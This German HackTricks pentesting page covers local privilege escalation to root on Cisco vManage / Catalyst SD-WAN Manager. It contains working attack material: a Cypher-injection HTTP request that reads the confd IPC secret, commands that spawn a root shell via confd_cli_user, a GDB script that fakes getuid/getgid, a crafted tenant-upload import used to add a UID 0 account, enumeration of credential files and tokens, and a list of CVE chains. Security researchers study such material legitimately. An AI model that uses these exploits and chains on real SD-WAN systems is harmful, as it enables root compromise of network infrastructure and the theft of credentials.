# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Sobald du Codeausführung auf Cisco vManage / *Catalyst SD-WAN Manager* als `vmanage`, `netadmin` oder `vmanage-admin` hast, sind die interessantesten lokalen privesc-Angriffsflächen normalerweise der `confd`-CLI-Stack, der `cmdptywrapper`-Helper, REST-APIs auf localhost und root-eigene Import-/Upload-Handler.

Wenn du noch den **initialen foothold** auf einem Controller benötigst, sieh dir zuerst die dedizierte control-plane-Seite an:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Schnelle lokale Triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Wenn `/etc/confd/confd_ipc_secret` von deinem foothold aus lesbar ist, werden Path 1 und Path 2 sofort praktisch nutzbar. Wenn du über einen Remote-info-leak oder eine webshell eingestiegen bist, prüfe außerdem, ob du bereits auf `vmanage-admin`-SSH-Material oder Multitenancy-Upload-Handler zugreifen kannst: Die Forschung von 2026 zeigte, dass beide realistische Zwischenschritte waren.

## Path 1

(Beispiel von [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nach einer kurzen Recherche in einigen auf `confd` und die verschiedenen Binaries bezogenen [Dokumentationen](http://66.218.245.39/doc/html/rn03re18.html) (die mit einem Account auf der Cisco-Website zugänglich sind) stellten wir fest, dass zur Authentifizierung des IPC-Sockets ein Secret verwendet wird, das sich in `/etc/confd/confd_ipc_secret` befindet:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Erinnern Sie sich an unsere Neo4j-Instanz? Sie läuft mit den Berechtigungen des Benutzers `vmanage`, wodurch wir die Datei mithilfe der vorherigen Schwachstelle abrufen können:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Das Programm `confd_cli` unterstützt keine Befehlszeilenargumente, ruft jedoch `/usr/bin/confd_cli_user` mit Argumenten auf. Daher könnten wir `/usr/bin/confd_cli_user` direkt mit unseren eigenen Argumenten aufrufen. Mit unseren aktuellen Berechtigungen ist es jedoch nicht lesbar. Deshalb müssen wir es aus dem rootfs abrufen, mittels scp kopieren, die Hilfe anzeigen und es verwenden, um die shell zu erhalten:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Pfad 2

(Beispiel von [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Der Blog¹ des synacktiv-Teams beschrieb eine elegante Möglichkeit, eine root shell zu erhalten. Der Haken dabei ist jedoch, dass dafür eine Kopie von `/usr/bin/confd_cli_user` benötigt wird, die nur von root gelesen werden kann. Ich fand eine andere Möglichkeit, ohne diesen Aufwand zu root zu eskalieren.

Beim Disassemblieren der Binärdatei `/usr/bin/confd_cli` beobachtete ich Folgendes:

<details>
<summary>Objdump zur Anzeige der UID/GID-Erfassung</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Beim Ausführen von „ps aux“ habe ich Folgendes beobachtet (_Hinweis: -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ich vermutete, dass das Programm „confd_cli“ die Benutzer-ID und Gruppen-ID, die es vom angemeldeten Benutzer erfasst hat, an die Anwendung „cmdptywrapper“ übergibt.

Mein erster Versuch bestand darin, „cmdptywrapper“ direkt auszuführen und ihm `-g 0 -u 0` zu übergeben, aber das schlug fehl. Offenbar wurde irgendwo im Ablauf ein Dateideskriptor (-i 1015) erstellt, den ich nicht vortäuschen kann.

Wie im Blog von synacktiv (letztes Beispiel) erwähnt, unterstützt das Programm `confd_cli` keine Kommandozeilenargumente. Ich kann es jedoch mit einem Debugger beeinflussen, und glücklicherweise ist GDB auf dem System enthalten.

Ich erstellte ein GDB-Skript, in dem ich die APIs `getuid` und `getgid` zwang, 0 zurückzugeben. Da ich durch die Deserialization RCE bereits über die Berechtigung „vmanage“ verfüge, darf ich `/etc/confd/confd_ipc_secret` direkt lesen.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Konsolenausgabe:

<details>
<summary>Konsolenausgabe</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pfad 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco dokumentierte später in einem eigenen Advisory für [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) einen saubereren lokalen root-Pfad: Ein **authentifizierter Angreifer mit ausschließlich Read-only-Berechtigungen** konnte eine manipulierte Anfrage an die Manager-CLI senden und aufgrund unzureichender Input-Validierung zu root wechseln.

Aus offensiver Sicht ist dies die wichtige Erkenntnis:

1. Sobald du *irgendeinen* Low-Priv-Foothold auf der Box hast, solltest du den lokalen CLI-Service testen, bevor du den aufwendigeren Path-1-/Path-2-Workflow verwendest.
2. Verwende die Artefakte aus Path 2 erneut, um die Trust Boundary zu finden: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Behandle jedes an das CLI-Backend weitergeleitete Feld als verdächtig: UID/GID, Username, Terminal-Metadaten, importierte Dateien oder jeden Wert, der später von einem root-eigenen Helper verarbeitet wird.
4. Wenn ein Low-Priv-User den lokalen CLI-Socket erreichen und diese Felder beeinflussen kann, ist root möglicherweise nur eine manipulierte Anfrage entfernt.

Ein praktischer Workflow nach dem Landing auf der Appliance ist:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Das macht den Bug von 2025 zu einem guten Hunting-Pattern für ähnliche Versionen: Suche nach **lokalen CLI-Shims, die Identitätsinformationen im Userland sammeln und an einen privilegierteren Wrapper weiterleiten**.

Verwechsle **CVE-2025-20122** nicht mit der späteren **CVE-2026-20122**: Das Problem von 2025 ist ein *lokaler* CLI-to-root-Bug, während das Problem von 2026 ein *entferntes* Überschreiben beliebiger Dateien über die API ist, das hauptsächlich dazu dient, einen Foothold zu platzieren und anschließend Path 1 / Path 2 / Path 4 erneut zu untersuchen.

## Path 4 (2026: REST API mit niedrigen Privilegien zu root – CVE-2026-20126)

Cisco's Advisory vom Februar 2026 führte außerdem eine weitere nützliche Privesc-Klasse ein: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) ermöglichte es einem **authentifizierten lokalen Angreifer mit niedrigen Privilegien**, aufgrund eines unzureichenden Mechanismus zur Benutzerauthentifizierung in der REST API root zu erlangen.

Das ist relevant, weil vManage-Privesc nicht mehr auf `confd`-/TTY-Missbrauch beschränkt ist. Nach dem Erhalt einer Shell mit niedrigen Privilegien solltest du außerdem nach Folgendem suchen:

- Nur auf localhost erreichbare API-Endpunkte, die dem Aufrufer zu stark vertrauen
- Tokens, Cookies oder Service-Credentials, die vom aktuellen Account gelesen werden können
- Nur für root vorgesehene Aktionen, die über `dataservice`-/REST-Handler verfügbar gemacht wurden und weiterhin lokal ausgelöst werden können

Sobald du in der Praxis eine Shell als `vmanage` oder ein anderer Service-User hast, ist lokaler API-Missbrauch oft unauffälliger und leichter zu automatisieren als interaktiver CLI-Missbrauch:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Wenn der Kontext der lokalen Session ausreicht, um privilegierte REST-Funktionen aufzurufen, sollte der API-Pfad bevorzugt werden: Er lässt sich einfacher wiederholen, skripten und mit gestohlenen Web-Sessions oder API-Tokens verknüpfen.

## Pfad 5 (2026 von root verarbeitete Datei - CVE-2026-20245)

Ein weiteres aktuelles Muster ist [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): Ein lokaler Angreifer mit `netadmin`-Berechtigungen konnte eine **präparierte Datei** hochladen, die anschließend von der CLI unsicher verarbeitet wurde, was zu Command Injection als `root` führte.

Aus Sicht von HackTricks ist die wertvolle Technik umfassender als die spezifische CVE:

1. Führe eine Enumeration aller CLI- oder Web-Workflows durch, die eine Datei akzeptieren: Importe, Diagnose-Bundles, Templates, Validatoren, Backups, Tenant-Daten usw.
2. Verfolge, wo die hochgeladene Datei abgelegt wird und welches root-eigene Script oder Binary sie verarbeitet.
3. Teste, ob der Dateiname, der Dateiinhalt oder geparste Metadaten jemals an Shell-Befehle, Wrapper-Scripts oder `system()`-artige Helfer übergeben werden.
4. Wenn du bereits `netadmin` erreichen kannst (gültige Zugangsdaten, gestohlene Session oder eine Auth-Bypass-Kette), sind Bugs bei der Dateiverarbeitung oft der schnellste Weg zu root.

Google Cloud / Mandiant zeigte später ein sehr konkretes Beispiel dafür, wie diese Bug-Klasse über den Multitenancy-Importpfad ausgenutzt wurde:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Beim beobachteten Angriff führte die präparierte CSV-Datei dazu, dass `/etc/passwd` und `/etc/shadow` geändert wurden, um ein temporäres Konto mit UID 0 (`troot`) zu erstellen. Dadurch sind Importer im Stil von `tenant-upload` / `tenant-list` besonders interessant: Sie sind nicht nur Funktionen zur Datenaufnahme, sondern potenzielle Parser-Frontends mit Root-Rechten.

Ein schnelles Shell-seitiges Suchmuster ist:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Diese Bug-Klasse lässt sich besonders gut mit remote footholds kombinieren, die `netadmin`, aber nicht `root` gewähren.

## Weitere aktuelle vManage/Catalyst SD-WAN Manager-Vulns zum Chaining

- **Unauthenticated info leak (CVE-2026-20133)** – Besonders wertvoll, weil öffentliche Forschung gezeigt hat, dass dadurch `confd_ipc_secret` oder der private Schlüssel von `vmanage-admin` offengelegt werden können. Damit wird aus einem Read-Bug entweder Path 1 oder ein NETCONF-Pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Anders als der oben genannte CLI-Bug aus dem Jahr 2025; VulnCheck nutzte ihn zum Upload eines webshell, wodurch die lokalen privesc-Pfade auf dieser Seite unmittelbar relevant werden.
- **Authenticated UI XSS (CVE-2024-20475)** – Eine Admin-Session in der Web-UI stehlen und anschließend in API-/CLI-Aktionen pivoten, die schließlich `vshell` oder einen der oben genannten lokalen privesc-Pfade erreichen.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Ein sehr starker Vorläufer für Path 5, weil `netadmin` genau die für den crafted-file-privesc von 2026 erforderliche Berechtigungsstufe ist.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ähnlicher offensiver Wert wie CVE-2026-20122, jedoch über einen späteren Web-UI-Upload-Pfad: in eine Position schreiben, die später von `root` oder der Web-Tier der Management-Plane geparst wird.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusionen aus dem Jahr 2026 zeigten, dass Angreifer auf einen älteren verwundbaren SD-WAN-Build zurückrollen, den alten CLI-root-Bug ausnutzen und anschließend die ursprüngliche Version wiederherstellen können.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Besser auf der dedizierten SD-WAN-Control-Plane-Seite dokumentiert; dadurch kann ein SSH-Schlüssel für `vmanage-admin` angehängt werden, wodurch der lokale foothold entsteht, der erforderlich ist, um zu dieser Seite zurückzukehren.



## Referenzen

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
